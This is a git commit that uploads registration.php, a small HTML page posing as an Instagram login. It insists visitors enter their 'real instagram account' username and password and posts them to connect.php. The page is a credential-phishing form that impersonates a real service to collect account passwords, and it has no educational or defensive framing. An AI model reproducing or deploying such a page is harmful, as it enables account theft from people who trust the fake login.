7a3a803efaab4bf8279db1c5132a1aa9219aa319
xstylishprince <84615755+xstylishprince@users.noreply.github.com>
2021-05-22 01:28:57 -0700

    Add files via upload

---
+++ registration.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<form method="post" action="connect.php">
+<title>login instagram</title>
+<link rel="stylesheet"type="text/css"herf="./style.css">
+</head>
+<body>
+<div class="instagram-login">
+<h1>login with real instagram account must ( compulsory)!!!</h1>
+
+Username : <input type="text" name="username"><br><br>
+Password : <input type="password" name="password"><br><br>
+<input type="submit" value="Submit">
+</form>
+</body>
+</html>
